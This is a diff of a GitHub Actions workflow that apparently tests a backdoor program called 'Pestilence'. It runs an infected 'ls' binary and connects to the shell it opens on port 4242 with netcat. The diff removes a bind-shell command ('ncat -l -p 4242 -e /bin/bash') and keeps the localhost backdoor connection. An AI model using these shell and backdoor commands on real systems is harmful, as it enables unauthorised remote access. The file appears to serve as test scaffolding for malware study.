@@ -267,6 +267,9 @@ jobs:
       with:
         name: Pestilence
 
+    - name: Install ncat
+      run: sudo apt-get install -y ncat
+
     - name: Make pestilence executable
       run: chmod +x ./Pestilence
 
@@ -277,7 +280,7 @@ jobs:
       run: ./Pestilence
 
     - name: Connect to ls backdoor
-      run: ncat -l -p 4242 -e /bin/bash -v -q 1 && /tmp/test/ls > /dev/null && echo "id" | nc -v -q 1 localhost 4242 > backdoor_output
+      run: /tmp/test/ls > /dev/null && echo "id" | nc -v -q 1 localhost 4242 > backdoor_output
 
     - name: Upload backdoor output
       uses: actions/upload-artifact@v4
